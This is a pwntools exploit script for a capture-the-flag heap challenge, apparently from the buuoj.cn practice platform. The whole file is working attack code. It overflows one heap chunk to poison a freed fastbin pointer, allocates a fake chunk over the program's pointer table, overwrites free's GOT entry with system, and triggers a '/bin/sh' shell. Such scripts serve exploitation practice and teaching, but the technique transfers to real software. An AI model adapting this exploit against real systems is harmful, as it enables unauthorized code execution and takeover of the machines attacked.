from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",28919)
elf=ELF("./timu")

def alloc(size,content):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"1")
	sh.recvuntil(b"Size of Heap : ")
	sh.sendline(str(size))
	sh.recvuntil(b"Content of heap:")
	sh.sendline(content)

def edit(index,size,content):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"2")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))
	sh.recvuntil(b"Size of Heap : ")
	sh.sendline(str(size))
	sh.recvuntil(b"Content of heap : ")
	sh.sendline(content)

def free(index):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"3")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))

free_got=elf.got["free"]
system_plt=0x0000000000400700

alloc(0x60,b"aaaa")
alloc(0x60,b"aaaa")
alloc(0x60,b"aaaa")
free(2)
payload=b"/bin/sh\x00"+0x60*b'a'+p64(0x71)+p64(0x6020ad)
edit(1,len(payload),payload)
alloc(0x60,b"aaaa")
alloc(0x60,b"aaaa")
payload=0x3*b'a'+0x20*b'a'+p64(free_got)
edit(3,len(payload),payload)
edit(0,8,p64(system_plt))
free(1)
sh.interactive()
